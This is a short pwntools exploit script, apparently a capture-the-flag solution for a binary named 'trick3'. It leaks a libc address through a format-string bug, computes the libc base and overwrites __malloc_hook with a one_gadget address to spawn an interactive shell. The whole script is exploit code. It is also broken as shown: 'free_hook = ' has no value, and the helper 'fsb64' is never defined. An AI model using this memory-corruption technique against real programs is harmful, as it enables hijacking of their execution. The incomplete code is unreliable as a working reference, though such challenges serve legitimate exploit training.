#!/usr/bin/python 
from pwn import *

p = process("./trick3")
elf = ELF("./trick3")
libc = elf.libc

def malloc(data):
    p.sendlineafter("> ", '1')
    p.sendafter(">" , data)

def free():
    p.sendlineafter("> ", '2')

def fsb(data):
    p.sendlineafter("> ", '3')
    p.sendafter("> ", data)

pay = ''
pay += '%43$p'

fsb(pay)

leak = int(p.recv(14), 16)
libcBase = leak - libc.symbols['__libc_start_main'] - 240
malloc_hook = libcBase + libc.symbols['__malloc_hook']
one_gadget = libcBase + 0x4526a
free_hook = 

payload = fsb64(8, malloc_hook, one_gadget)
fsb(payload)
free()

p.interactive()
